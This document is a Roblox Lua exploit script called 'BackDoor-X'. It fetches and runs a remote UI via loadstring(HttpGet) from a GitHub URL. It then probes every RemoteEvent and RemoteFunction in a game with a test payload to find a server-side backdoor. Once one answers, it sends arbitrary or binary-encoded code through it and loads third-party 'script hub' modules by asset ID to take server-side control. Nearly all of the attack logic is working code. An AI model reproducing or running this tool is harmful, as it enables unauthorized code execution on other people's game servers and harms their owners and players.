local start = tick()
print('begin')
local debuging = true
local encryption = false
local backdoor_x = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiBiRiK/backdoor-x/main/ui.lua"))();
local tweenService = game:GetService("TweenService")
local inputService = game:GetService("UserInputService")
local localPlayer = game:GetService("Players").LocalPlayer
local JointsService = game:GetService("JointsService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
local ui = backdoor_x.BackDoorX
local notify = backdoor_x.Frame_37
local mainFrame = backdoor_x.Frame_1
local RunService = game:GetService("RunService")
local sideBar = backdoor_x.Frame_2
local tabHolder = backdoor_x.Frame_11
local tableFind = table.find
local svn = math.random(1000000, 9999999);
local attached = false;
local backdoor = nil;
local commonPlaces = {
	game:GetService('ReplicatedStorage'),
	workspace,
	game:GetService('Lighting'),
	game
};
local tabs = {}
local rcs = {}
for i, v in next, tabHolder:GetChildren() do
	tabs[v.Name] = v;
end
function inTable(table, element)
	for i,v in pairs(table) do
		if v == element then
			return true
		end
	end
	return false
end
local function setstatus(text:string)
	backdoor_x.ping8.Text=[[:]]..text..[[]]
end
local function notif(title:string,desc:string,during:number)
	backdoor_x.ping9.Text=title
	backdoor_x.TextLabel_60.Text=desc
	wait(1)	
	local TweenService = game:GetService("TweenService")
	local info = TweenInfo.new(1)
	local properties = {Position = UDim2.new(0.811999977, 0, 0.86500001, 0)}
	local tween = TweenService:Create(backdoor_x.Frame_37,info,properties)
	tween:Play()
	wait(during)
	local TweenService = game:GetService("TweenService")
	local info = TweenInfo.new(1)
	local properties = {Position = UDim2.new(0.811999977, 0, 1.86500001, 0)}
	local tween = TweenService:Create(backdoor_x.Frame_37,info,properties)
	tween:Play()
end
local executing = false;
local function validRemote(rm)
	local Parent = rm.Parent
	local class = rm.ClassName
	if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end

	if Parent then
		if Parent == JointsService then return false end
		if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
			(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
	end

	if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end

	return true
end

local function scanDescendants(parent)
	local descendance = parent:GetDescendants();
	for i=1, #descendance do
		local descendant = descendance[i];
		if not validRemote(descendant) then continue; end
		local rc = tostring(math.random(100000, 999999));
		rcs[rc] = descendant;
		local remoteClass = descendant.ClassName
		local requireScript = ("i=Instance.new('StringValue', game.Lighting); i.Name='%s'; i.Value='%s'"):format(svn,rc)
		if remoteClass == "RemoteEvent" then
			if debuging then
				print([[DEBUG(BETA): ]]..[[TESTING: ]]..descendant:GetFullName())
			end
			descendant:FireServer(requireScript)
		elseif remoteClass == "RemoteFunction" then
			local waiting = true
			task.spawn(function()
				if debuging then
					print([[DEBUG(BETA): ]]..[[TESTING: ]]..descendant:GetFullName())
				end
				descendant:InvokeServer(requireScript)
				waiting = nil
			end)
			local begin = DateTime.now().UnixTimestampMillis
			while waiting and 1000 > DateTime.now().UnixTimestampMillis - begin do
				task.wait()
			end
		end
		if game.Lighting:FindFirstChild(svn) then
			attached = true
			backdoor = rcs[game.Lighting:FindFirstChild(svn).Value]
			backdoor:FireServer(("game.Lighting['%s']:Destroy()"):format(svn))

			return true
		end
	end
end
local function scanGame()
	local found = false
	setstatus('Scanning')
	for i=1, #commonPlaces do
		local place = commonPlaces[i];
		if scanDescendants(place) then
			found = true
		end
	end
	local children = game:GetChildren();
	for i=1, #children do
		local child = children[i];
		if tableFind(commonPlaces, child) then continue; end
		if scanDescendants(child) then 
			found = true
		end
	end
	if found then
		setstatus('Connected')
		notif('Success',"Backdoor Found!",4)
	else
		setstatus('NaN')
		notif('Failed!',"Unable to find backdoor!",4)
	end

	return found;
end
function Encode(Text:string):string
	Text = tostring(Text)
	local Table = {}
	for i = 1, #Text do
		local T = Text:sub(i, i)
		table.insert(Table, T)
	end
	local T = {}
	local MyText = "'"
	for i, v in pairs(Table) do
		local Key = string.byte(v)
		MyText = MyText..math.floor(Key/128)
		Key = Key % 128
		MyText = MyText..math.floor(Key/64)
		Key = Key % 64
		MyText = MyText..math.floor(Key/32)
		Key = Key % 32
		MyText = MyText..math.floor(Key/16)
		Key = Key % 16
		MyText = MyText..math.floor(Key/8)
		Key = Key % 8
		MyText = MyText..math.floor(Key/4)
		Key = Key % 4
		MyText = MyText..math.floor(Key/2)
		Key = Key % 2
		MyText = MyText..math.floor(Key/1)
		Key = Key % 1
		MyText=MyText.."','"
	end
	MyText = MyText:sub(1, #MyText -1)
	if tonumber(MyText) then
		MyText = tonumber(MyText)
	end
	return MyText
end
local function execute(code)
	if not attached then
		scanGame()
	end
if encryption then
	local Encoded = Encode(code)
	local main=tostring([[local BinaryEncrypted = ]].."table.concat({"..Encoded.."})"..[[ function decode(str) local function binary_to_string(bin) return string.char(tonumber(bin, 2));end;return (str:gsub("(".. ("[01]"):rep(8) .. ")", binary_to_string));end;local Binary = BinaryEncrypted local EncodedBinary = decode(Binary);require(0x23FAA3E06)(EncodedBinary)()]])
	local scripty = tostring(main)
	if debuging then
		print([[DEBUG(BETA): ]]..code)
	end
	if backdoor.ClassName == "RemoteEvent" then
		backdoor:FireServer(scripty)
	elseif backdoor.ClassName == "RemoteFunction" then
		backdoor:InvokeServer(scripty)
		end
	else
	local scripty = tostring(code)
	if debuging then
		print([[DEBUG(BETA): ]]..code)
	end
	if backdoor.ClassName == "RemoteEvent" then
		backdoor:FireServer(scripty)
	elseif backdoor.ClassName == "RemoteFunction" then
		backdoor:InvokeServer(scripty)
	end
    end
end
local function createDrag(frame, dragDelay)
	local dragToggle, dragInput, dragStart, startPos

	local function updateInput(input)
		local Delta = input.Position - dragStart
		local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
		if dragDelay == 0 or tonumber(dragDelay) == nil then
			frame.Position = Position
		else
			tweenService:Create(frame, TweenInfo.new(tonumber(dragDelay) or .1), {Position = Position}):Play()
		end
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and inputService:GetFocusedTextBox() == nil then
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	inputService.InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
end

createDrag(mainFrame)
local function getButtons(object)
	local a = {}
	for i, v in next, object:GetChildren() do
		if not v:IsA"TextButton" and not v:IsA"ImageButton" then
			continue;
		end
		table.insert(a, v)
	end

	local clone = table.clone(a)
	setmetatable(a, {
		__index = function(_, b)
			if clone[b] then
				return clone[b]
			end
			return object:FindFirstChild(b)
		end
	})
	return a
end
if tabs.executor then
	local buttons = getButtons(tabs.executor)
	local editor = backdoor_x.Code

	buttons.Execute.MouseButton1Up:Connect(function()
		execute(editor.Text)
	end)
end
if attached then
	setstatus('Connected')
end
----------------------------------------------------------------------------------------------------ANIMATE#PAGES
local function Core1(script)
	local scripthub = script.Parent.scripthub
	local home = script.Parent.home
	local settings = script.Parent.settings
	local executor = script.Parent.executor
	local scripthubframe = script.Parent.Parent.Frame.scripthub
	local homeframe = script.Parent.Parent.Frame.home
	local executorframe= script.Parent.Parent.Frame.executor
	local settingsframe = script.Parent.Parent.Frame.settings
	scripthub.MouseButton1Click:Connect(function()
		if scripthub.BackgroundColor3== Color3.fromHSV(0.611111, 1, 1)then
		else
			scripthub.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 1)
			scripthub.BackgroundColor3 = Color3.fromHSV(0.611111, 1, 1)
			home.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			home.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)
			scripthub.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.866667)
			scripthub.Frame.Visible=true
			scripthub.Frame2.Visible=true
			scripthub.Frame.Size=UDim2.new(0, 5,0, 0)
			scripthub.Frame2.Size=UDim2.new(0, 5,0, 0)




			homeframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)

			executorframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)

			settingsframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)




			scripthubframe.Visible=true
			scripthubframe.Position= UDim2.new(0, 0,1, 0)
			scripthubframe:TweenPosition(UDim2.new(0, 0,0, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)




			home.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			home.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			settings.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			settings.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			settings.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			settings.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)


			executor.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			executor.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			executor.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			executor.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)



			scripthub.Frame:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)

			scripthub.Frame2:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)



		end
	end)
	home.MouseButton1Click:Connect(function()
		if home.BackgroundColor3== Color3.fromHSV(0.611111, 1, 1)then
		else

			home.BackgroundColor3 = Color3.fromHSV(0.611111, 1, 1)
			scripthub.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			scripthub.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)
			home.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 1)
			home.Frame.Visible=true
			home.Frame2.Visible=true
			home.Frame.Size=UDim2.new(0, 5,0, 0)
			home.Frame2.Size=UDim2.new(0, 5,0, 0)


			homeframe.Visible=true
			homeframe.Position= UDim2.new(0, 0,1, 0)
			homeframe:TweenPosition(UDim2.new(0, 0,0, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)


			scripthub.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			scripthub.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			scripthubframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)

			executorframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)

			settings.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			settings.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			settings.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			settings.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)


			executor.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			executor.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			executor.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			executor.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)





			home.Frame:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)

			home.Frame2:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)
		end
	end)
	executor.MouseButton1Click:Connect(function()
		if executor.BackgroundColor3== Color3.fromHSV(0.611111, 1, 1)then
		else
			executor.BackgroundColor3 = Color3.fromHSV(0.611111, 1, 1)

			executor.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 1)
			executor.Frame.Visible=true
			executor.Frame2.Visible=true
			executor.Frame.Size=UDim2.new(0, 5,0, 0)
			executor.Frame2.Size=UDim2.new(0, 5,0, 0)

			scripthub.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			scripthub.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)



			scripthubframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)


			executorframe.Visible=true
			executorframe.Position= UDim2.new(0, 0,1, 0)
			executorframe:TweenPosition(UDim2.new(0, 0,0, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)


			settingsframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)
			scripthub.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			scripthub.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)




			homeframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)


			settings.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			settings.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			settings.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			settings.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)


			home.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			home.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			home.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			home.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)





			executor.Frame:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)

			executor.Frame2:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)
		end
	end)
	settings.MouseButton1Click:Connect(function()
		if settings.BackgroundColor3== Color3.fromHSV(0.611111, 1, 1)then
		else
			settings.BackgroundColor3 = Color3.fromHSV(0.611111, 1, 1)

			settings.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 1)
			settings.Frame.Visible=true
			settings.Frame2.Visible=true
			settings.Frame.Size=UDim2.new(0, 5,0, 0)
			settings.Frame2.Size=UDim2.new(0, 5,0, 0)

			scripthub.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			scripthub.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)

			executor.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			executor.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)
			executor.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			executor.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			scripthubframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)

			executorframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)


			settingsframe.Visible=true
			settingsframe.Position= UDim2.new(0, 0,1, 0)
			settingsframe:TweenPosition(UDim2.new(0, 0,0, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)

			homeframe:TweenPosition(UDim2.new(0, 0,-1, 0),
				Enum.EasingDirection.Out, 
				Enum.EasingStyle.Linear, 
				0.3, 
				false 
			)

			scripthub.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			scripthub.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)




			home.Frame:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)

			home.Frame2:TweenSize(UDim2.new(0, 5,0, 0),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.1,                         
				false                       
			)
			home.BackgroundColor3 = Color3.fromHSV(0, 0, 0.0784314)
			home.ImageLabel.ImageColor3 = Color3.fromHSV(0, 0, 0.654902)





			settings.Frame:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)

			settings.Frame2:TweenSize(UDim2.new(0, 5,0, 11),
				Enum.EasingDirection.Out,
				Enum.EasingStyle.Linear, 
				0.2,                         
				false                       
			)
		end
	end)
end
----------------------------------------------------------------------------------------------------EXECUTE
local function Core18(script)
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Visible=false
		script.Parent.Parent.pending.Visible=true
		wait(1)
		if executing then
			return;
		end
		executing = true;
		local code = backdoor_x.Code.Text;
		execute(code);
		script.Parent.Parent.pending.Visible=false
		script.Parent.Parent.success.Visible=true
		wait(2)
		script.Parent.Parent.success.Visible=false
		script.Parent.Visible=true
		executing = false
	end)
end
----------------------------------------------------------------------------------------------------SCRIPT-HUB#0
backdoor_x.TextButton_10.MouseButton1Click:Connect(function()
	script.Parent.Visible=false
	script.Parent.Parent.pending.Visible=true
	wait(1)
	if executing then
		return;
	end
	executing = true;
	local code = [[require(4967315171).load(']]..game.Players.LocalPlayer.Name..[[')]] ;
	execute(code);
	script.Parent.Parent.pending.Visible=false
	script.Parent.Parent.success.Visible=true
	wait(2)
	script.Parent.Parent.success.Visible=false
	script.Parent.Visible=true
	executing = false
end)
----------------------------------------------------------------------------------------------------SCRIPT-HUB#1
local function Core14(script)
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Visible=false
		script.Parent.Parent.pending.Visible=true
		wait(1)
		if executing then
			return;
		end
		executing = true;
		execute([[require(5146659840).Dark_Eccentric('Dark_Eccentric',']]..game.Players.LocalPlayer.Name..[[')]])
		script.Parent.Parent.pending.Visible=false
		script.Parent.Parent.success.Visible=true
		wait(2)
		script.Parent.Parent.success.Visible=false
		script.Parent.Visible=true
		executing = false
	end)
end
----------------------------------------------------------------------------------------------------CLEAR
local function Core19(script)
	local textbox = script.Parent.Parent.Frame.SFrame.TextBox
	script.Parent.MouseButton1Click:Connect(function()
		textbox.Text=""
	end)
end
----------------------------------------------------------------------------------------------------RE
local function Core21(script)
	local re = [[game:GetService('Players'):FindFirstChild(']]..localPlayer.Name..[['):LoadCharacter()]]
	script.Parent.MouseButton1Click:Connect(function()
		execute(re)
	end)
end
----------------------------------------------------------------------------------------------------HIGHLIGHT
local function Core24(script)
	local Source = script.Parent.TextBox
	local Lines = Source.Parent.Parent.Lines
	local lua_keywords = {"and", "break", "do", "else", "elseif", "end", "false", "for", "function", "goto", "if", "in", "local", "nil", "not", "or", "repeat", "return", "then", "true", "until", "while", "v5"}
	local global_env = {"getrawmetatable", "game", "workspace", "script", "math", "string", "table", "print", "wait", "BrickColor", "Color3", "next", "pairs", "ipairs", "select", "unpack", "Instance", "Vector2", "Vector3", "CFrame", "Ray", "UDim2", "Enum", "assert", "error", "warn", "tick", "loadstring", "_G", "shared", "getfenv", "setfenv", "newproxy", "setmetatable", "getmetatable", "os", "debug", "pcall", "ypcall", "xpcall", "rawequal", "rawset", "rawget", "tonumber", "tostring", "type", "typeof", "_VERSION", "coroutine", "delay", "require", "spawn", "LoadLibrary", "settings", "stats", "time", "UserSettings", "version", "Axes", "ColorSequence", "Faces", "ColorSequenceKeypoint", "NumberRange", "NumberSequence", "NumberSequenceKeypoint", "gcinfo", "elapsedTime", "collectgarbage", "PhysicalProperties", "Rect", "Region3", "Region3int16", "UDim", "Vector2int16", "Vector3int16", "BestSide"}
	local Highlight = function(string, keywords)
		local K = {}
		local S = string
		local Token =
			{
				["="] = true,
				["."] = true,
				[","] = true,
				["("] = true,
				[")"] = true,
				["["] = true,
				["]"] = true,
				["{"] = true,
				["}"] = true,
				[":"] = true,
				["*"] = true,
				["/"] = true,
				["+"] = true,
				["-"] = true,
				[">"] = true,
				["<"] = true,
				["%"] = true,
				[";"] = true,
				["~"] = true
			}
		for i, v in pairs(keywords) do
			K[v] = true
		end
		S = S:gsub(".", function(c)
			if Token[c] ~= nil then
				return "\32"
			else
				return c
			end
		end)
		S = S:gsub("%S+", function(c)
			if K[c] ~= nil then
				return c
			else
				return (" "):rep(#c)
			end
		end)

		return S
	end

	local hTokens = function(string)
		local Token =
			{
				["="] = true,
				["."] = true,
				[","] = true,
				["("] = true,
				[")"] = true,
				["["] = true,
				["]"] = true,
				["{"] = true,
				["}"] = true,
				[":"] = true,
				["*"] = true,
				["/"] = true,
				["+"] = true,
				[">"] = true,
				["<"] = true,
				["-"] = true,
				["%"] = true,
				[";"] = true,
				["~"] = true
			}
		local A = ""
		string:gsub(".", function(c)
			if Token[c] ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)

		return A
	end


	local strings = function(string)
		local QuoteOpen = false
		return string:gsub("%S", function(Character)
			if Character == '"' or Character == "'" then
				QuoteOpen = not QuoteOpen
				return Character
			end
			return QuoteOpen and Character or "\32"
		end)
	end

	local comments = function(string)
		local ret = ""
		string:gsub("[^\r\n]+", function(c)
			local comm = false
			local i = 0
			c:gsub(".", function(n)
				i = i + 1
				if c:sub(i, i + 1) == "--" then
					comm = true
				end
				if comm == true then
					ret = ret .. n
				else
					ret = ret .. "\32"
				end
			end)
			ret = ret
		end)

		return ret
	end
	local numbers = function(string)
		local A = ""
		string:gsub(".", function(c)
			if tonumber(c) ~= nil then
				A = A .. c
			elseif c == "\n" then
				A = A .. "\n"
			elseif c == "\t" then
				A = A .. "\t"
			else
				A = A .. "\32"
			end
		end)

		return A
	end
	local highlight_source = function(type)
		if type == "Text" then
			Source.Text = Source.Text:gsub("\13", "")
			Source.Text = Source.Text:gsub("\t", "      ")
			local s = Source.Text
			Source.Keywords_.Text = Highlight(s, lua_keywords)
			Source.Globals_.Text = Highlight(s, global_env)
			Source.RemoteHighlight_.Text = Highlight(s, {"FireServer", "fireServer", "InvokeServer", "invokeServer"})
			Source.Tokens_.Text = hTokens(s)
			Source.Numbers_.Text = numbers(s)
			Source.Strings_.Text = strings(s)
			local lin = 1
			s:gsub("\n", function()
				lin = lin + 1
			end)
			Lines.Text = ""
			for i = 1, lin do
				Lines.Text = Lines.Text .. i .. "\n"
			end
		end
	end
	highlight_source("Text")
	Source.Changed:Connect(highlight_source)
end
----------------------------------------------------------------------------------------------------CONTENT-HIDE
local function Core20(script)
	script.Parent.MouseButton1Click:Connect(function()
		if script.Parent.Parent.hide.Visible==true then
			script.Parent.Parent.hide.Visible=false
		else
			script.Parent.Parent.hide.Visible=true
		end
	end)
end
----------------------------------------------------------------------------------------------------TEXT-SETUP
local function Core23(script)
	script.Parent.Text="print(\"BackDoor-X on top!\")"
end
----------------------------------------------------------------------------------------------------R6
local function Core22(script)
	script.Parent.MouseButton1Click:Connect(function()
		local r6 = [[require(3436957371):r6(']]..localPlayer.Name..[[')]]
		execute(r6)
	end)
end
----------------------------------------------------------------------------------------------------PLAYERS
local function Core4(script)
	local txt = script.Parent
	local players = game.Players:GetPlayers()
	txt.Text = " "..#players.."/" .. game.Players.MaxPlayers .. " Players"
end
----------------------------------------------------------------------------------------------------GAME NAME

local function Core5(script)
	local txt = script.Parent
	txt.Text = [[idk]]--game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
end
----------------------------------------------------------------------------------------------------AVATAR
local function Core2(script)
	local plrs = game:GetService("Players")
	local plr = plrs.LocalPlayer
	local plravatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=100&height=100&format=png"
	local av = script.Parent
	av.Image = plravatar
end
----------------------------------------------------------------------------------------------------SCRIPT-HUB#2
local function Core12(script)
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Visible=false
		script.Parent.Parent.pending.Visible=true
		wait(1)
		execute([[require(2918747265).load(']]..game.Players.LocalPlayer.Name..[[')]])
		script.Parent.Parent.pending.Visible=false
		script.Parent.Parent.success.Visible=true
		wait(2)
		script.Parent.Parent.success.Visible=false
		script.Parent.Visible=true
		executing = false
	end)

end
----------------------------------------------------------------------------------------------------SCRIPT-HUB#3
local function Core6(script)
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Visible=false
		script.Parent.Parent.pending.Visible=true
		wait(1)
		if executing then
			return;
		end
		executing = true;
		execute([[require(7587661655).g(']]..game.Players.LocalPlayer.Name..[[','h')]])
		script.Parent.Parent.pending.Visible=false
		script.Parent.Parent.success.Visible=true
		wait(2)
		script.Parent.Parent.success.Visible=false
		script.Parent.Visible=true
		executing = false
	end)

end
----------------------------------------------------------------------------------------------------SCRIPT-HUB#4
local function Core8(script)

	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Visible=false
		script.Parent.Parent.pending.Visible=true
		wait(1)
		if executing then
			return;
		end
		executing = true;
		execute([[require(12736619973)(']]..game.Players.LocalPlayer.Name..[[')]])
		script.Parent.Parent.pending.Visible=false
		script.Parent.Parent.success.Visible=true
		wait(2)
		script.Parent.Parent.success.Visible=false
		script.Parent.Visible=true
		executing = false
	end)

end
----------------------------------------------------------------------------------------------------ANIMATION
local function Core7(script)
	script.Parent.Visible=true
	local warperFramerate = 30 
	local lastFrame = 1 
	local frames = 19 
	local rows = 5 
	local columns = 4 
	local AnimationFrameWrapper = script.Parent 
	local AnimatedSprite = AnimationFrameWrapper.Animated 
	local t = tick()
	AnimatedSprite.Size = UDim2.new(columns,0,rows,0)
	local function AnimationFunction()end
	local function UpdateWarper(f)
		if tick()-t >= 1/warperFramerate then 
			lastFrame = lastFrame + 1
			if lastFrame > frames then lastFrame = 1 end 
			local CurrentColumn = lastFrame 
			local CurrentRow = 1
			repeat 
				if CurrentColumn>columns then
					CurrentColumn = CurrentColumn - columns
					CurrentRow = CurrentRow + 1
				end
			until not(CurrentColumn>columns)
			AnimationFrameWrapper.Animated.Position = UDim2.new(-(CurrentColumn-1),0,-(CurrentRow-1),0)
			f()
			t = tick()
		end
	end
	game:GetService("RunService").RenderStepped:Connect(function()
		UpdateWarper(AnimationFunction)
	end)
end
----------------------------------------------------------------------------------------------------SCRIPT-HUB#5
local function Core10(script)
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Visible=false
		script.Parent.Parent.pending.Visible=true
		wait(1)
		if executing then
			return;
		end
		executing = true;
		execute([[require(6146060838)(']]..game.Players.LocalPlayer.Name..[[')]])
		script.Parent.Parent.pending.Visible=false
		script.Parent.Parent.success.Visible=true
		wait(2)
		script.Parent.Parent.success.Visible=false
		script.Parent.Visible=true
		executing = false
	end)

end
----------------------------------------------------------------------------------------------------END
coroutine.wrap(Core1)  (backdoor_x.Core1);
coroutine.wrap(Core7) (backdoor_x.Core17);
